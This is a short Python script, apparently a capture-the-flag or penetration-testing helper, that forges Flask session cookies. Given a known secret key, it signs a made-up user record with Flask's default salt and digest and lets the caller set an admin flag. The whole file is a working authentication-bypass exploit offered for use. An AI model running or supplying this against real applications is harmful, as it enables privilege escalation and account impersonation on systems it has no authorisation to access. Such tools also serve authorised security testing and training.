import hashlib
import sys

from flask.sessions import TaggedJSONSerializer
from itsdangerous import URLSafeTimedSerializer

SALT = "cookie-session"
KEY_DERIVATION = "hmac"
DIGEST_METHOD = hashlib.sha1

def main():
    if len(sys.argv) != 3:
        sys.stderr.write("usage: forge_cookie.py <secret> <is_admin>\n")
        sys.exit(2)
    secret = sys.argv[1]
    is_admin = int(sys.argv[2])

    signer = URLSafeTimedSerializer(
        secret,
        salt=SALT,
        serializer=TaggedJSONSerializer(),
        signer_kwargs=dict(
            key_derivation=KEY_DERIVATION,
            digest_method=DIGEST_METHOD,
        ),
    )
    payload = {
        "user": {
            "id": 99,
            "username": "forged",
            "is_admin": is_admin,
            "email": "[email protected]",
            "bio": "forged",
        }
    }
    sys.stdout.write(signer.dumps(payload))

if __name__ == "__main__":
    main()
